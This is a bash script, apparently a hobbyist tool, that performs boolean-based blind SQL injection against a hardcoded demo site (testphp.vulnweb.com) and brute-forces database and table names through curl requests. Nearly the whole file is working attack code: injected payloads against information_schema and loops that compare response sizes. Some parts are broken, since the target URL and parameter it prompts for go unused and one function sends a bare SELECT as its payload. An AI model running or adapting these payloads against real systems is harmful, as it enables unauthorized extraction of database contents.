#!/bin/bash

clear

echo -e "\033[1;31m██████╗░░█████╗░██╗░░░██╗██╗██████╗░░█████╗░██╗░░░░░░█████╗░"
echo "██╔══██╗██╔══██╗██║░░░██║██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗"
echo "██║░░██║███████║╚██╗░██╔╝██║██║░░██║██║░░██║██║░░░░░██║░░██║"
echo "██║░░██║██╔══██║░╚████╔╝░██║██║░░██║██║░░██║██║░░░░░██║░░██║"
echo "██████╔╝██║░░██║░░╚██╔╝░░██║██████╔╝╚█████╔╝███████╗╚█████╔╝"
echo -e "╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═════╝░░╚════╝░╚══════╝░╚════╝░\033[0m"

echo -e "\033[1;31mWelcome to the Blind SQL Injection Tool\033[0m"
echo "---------------------------------------"
echo "1. Find the number of databases"
echo "2. Brute force the database names"
echo "3. Find the number and brute force the database names"
echo "Select an option: "
read -r ACTION

echo "Select HTTP method:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
COOKIES=""

echo "Enter the target URL: "
read -r URL

echo "Enter the parameter to test (e.g., id): "
read -r PARAMETER

if [[ "$METHOD_CHOICE" -eq 2 ]]; then
	METHOD="POST"
	echo "Enter cookies if any (in the format 'cookieName1=cookieValue1; cookieName2=cookieValue2') or press enter to continue without:"
	read -r COOKIES
fi

send_request() {
    local data="uname=${1}&pass=${2}"
    local url="http://testphp.vulnweb.com/userinfo.php"  # Replace with your actual URL if different
    
    # cURL command with headers from the captured request
    curl -s -X POST "$url" \
         -H 'Host: testphp.vulnweb.com' \
         -H 'Cache-Control: max-age=0' \
         -H 'Upgrade-Insecure-Requests: 1' \
         -H 'Origin: http://testphp.vulnweb.com' \
         -H 'Content-Type: application/x-www-form-urlencoded' \
         -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
         -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
         -H 'Referer: http://testphp.vulnweb.com/login.php' \
         -H 'Accept-Encoding: gzip, deflate, br' \
         -H 'Accept-Language: es-ES,es;q=0.9' \
         --data "$data" \
         -w "%{size_download}\n" \
         -o /dev/null
}

extract_length() {
	local test_length
	local length
	local response_lengths=()
	local significant_difference=10
	local base_length=$(send_request "1' and '1'='2" -- -)

	for length in {1..20}; do
		test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -")
		response_lengths[$length]=$test_length

		if [ "$test_length" -ne "$base_length" ]; then
			echo $length
			return 0
		fi
	done
	echo 0
	return 0
}

extract_number_of_tables() {
	local db_name=$1
	local num_tables=0
	local reference_length=$(send_request "1' AND '1'='2" -- -) # Una consulta que siempre será falsa
	local current_length

    # Probamos con números crecientes hasta que encontremos uno que no tenga correspondencia.
    for ((i=1; i<=100; i++)); do
	    local query="1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='${db_name}')=${i} AND '1'='1"
	    current_length=$(send_request "$query")
	    if [[ "$current_length" != "$reference_length" ]]; then
		    num_tables=$i
	    else
		    break
	    fi
    done

    echo $num_tables
}

brute_force_table_names() {
	local db_name=$1
	echo "Extracting table names for database: $db_name"

    # Puedes ajustar este valor según la cantidad máxima esperada de tablas
    local max_tables=100  
    local table_name
    local found_char
    local position
    local current_length
    local reference_length=$(send_request "1' AND '1'='2" -- -) # Longitud de referencia

    # Vamos a intentar encontrar múltiples nombres de tabla
    for ((table_index=1; table_index<=max_tables; table_index++)); do
	    table_name=""
	    position=1
	    while : ; do
		    found_char=false
		    for ascii in {48..57} {65..90} {97..122} 95 ; do # Números, letras y guion bajo
			    if [[ "$ascii" == 95 ]]; then
				    char="_"
			    else
				    char=$(printf "\\$(printf '%03o' $ascii)")
			    fi
			    # La consulta SQL real va aquí
			    local query="1' OR ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='${db_name}' ORDER BY table_name LIMIT 1 OFFSET $((table_index - 1))), $position, 1))='$ascii'-- -"
			    current_length=$(send_request "$query")
			    if [[ "$current_length" != "$reference_length" ]]; then
				    table_name+="$char"
				    found_char=true
				    break
			    fi
		    done
		    if ! $found_char; then
			    break
		    fi
		    ((position++))
	    done
	    if [[ -z "$table_name" ]]; then
		    # Si no encontramos un nombre de tabla, no hay más tablas
		    break
	    fi
	    echo -e "\033[0;36mFound table:\033[0m $table_name"
    done
}

brute_force_db_names() {
	local number_of_databases=$1
	local db_name
	local current_length
	local reference_length=$(send_request "1' AND '1'='1" -- -)

	for ((db_index=1; db_index<=number_of_databases; db_index++)); do
		db_name=""
		local position=1
		echo -e "\033[0;31mBrute forcing the name of database $db_index...\033[0m"
		while : ; do
			local found_char=false
			for ascii in {48..57} {65..95} {97..122} ; do 
				if [[ "$ascii" -eq 95 ]]; then
					char="_"
				else
					char=$(printf "\\$(printf '%03o' "$ascii")")
				fi
				local query="1' OR ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET $((db_index - 1))), $position, 1))='$ascii' AND '1'='1"
				current_length=$(send_request "$query")
				if [[ "$current_length" != "$reference_length" ]]; then
					db_name+="$char"
					echo -n "$char"
					found_char=true
					break
				fi
			done
			if ! $found_char; then
				if [ -n "$db_name" ]; then
					echo -e "\033[0;34m\nFinished brute-forcing database $db_index name:\033[0m $db_name"
					brute_force_table_names "$db_name"
				fi
				break
			fi
			((position++))
		done
	done
}

brute_force_all(){
	local num_dbs=$(extract_length)
	if [ "$num_dbs" -gt 0 ]; then
		brute_force_db_names "$num_dbs"
		for ((db_index=1; db_index<=num_dbs; db_index++)); do
			local db_name=$(send_request "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET $((db_index - 1))") # Esto es un placeholder
			brute_force_table_names "$db_name"
		done
	else
		echo "Failed to find the number of databases."
	fi
}

list_items() {
	case "$ACTION" in
		1)
			extract_length
			;;
		2)
			local num_dbs=$(extract_length)
			if [ "$num_dbs" -gt 0 ]; then
				brute_force_db_names "$num_dbs"
			else
				echo "Failed to find the number of databases."
			fi
			;;
		3)
			brute_force_all
			;;
		*)
			echo "Invalid option."
			exit 1
			;;
	esac
}

list_items

